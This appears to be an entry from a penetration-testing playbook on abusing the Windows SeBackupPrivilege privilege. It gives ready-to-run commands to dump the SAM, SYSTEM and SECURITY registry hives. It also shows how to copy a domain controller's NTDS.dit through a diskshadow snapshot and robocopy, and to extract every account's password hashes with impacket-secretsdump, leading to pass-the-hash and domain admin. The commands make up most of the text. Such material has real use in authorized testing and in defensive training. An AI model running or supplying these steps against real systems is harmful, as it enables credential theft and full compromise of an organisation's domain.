---
id: windows-sebackup
title: SeBackupPrivilege
stage: privesc
tags: [windows, ad]
tools:
  - "whoami /priv | findstr /i SeBackupPrivilege"
  - "reg save HKLM\\SAM C:\\Temp\\SAM"
  - impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
leads_to:
  - pass-the-hash
  - domain-admin
  - dcsync
---

## Check

```cmd
whoami /priv | findstr /i "SeBackupPrivilege"
```

Common on: Backup Operators group members, some service accounts.

## Dump SAM/SYSTEM (any machine)

```cmd
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
```

```bash
# Transfer to attacker, then extract hashes
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

## Dump NTDS.dit (DC only — full domain hash dump)

```powershell
# diskshadow method
diskshadow /s C:\Temp\shadow.txt
# shadow.txt contents:
# set verbose on
# set metadata C:\Temp\meta.cab
# set context clientaccessible
# begin backup
# add volume C: alias cdrive
# create
# expose %cdrive% Z:
# end backup

# After shadow is created:
robocopy /b Z:\Windows\NTDS\ C:\Temp\ ntds.dit

# Get SYSTEM hive for decryption key
reg save HKLM\SYSTEM C:\Temp\SYSTEM

# Transfer both to attacker, then:
impacket-secretsdump -ntds C:\Temp\ntds.dit -system C:\Temp\SYSTEM LOCAL
```

## Notes

SeBackupPrivilege lets you bypass ACLs to read any file on disk — SAM and NTDS.dit are the primary targets. On a DC, ntds.dit gives you every domain account hash.
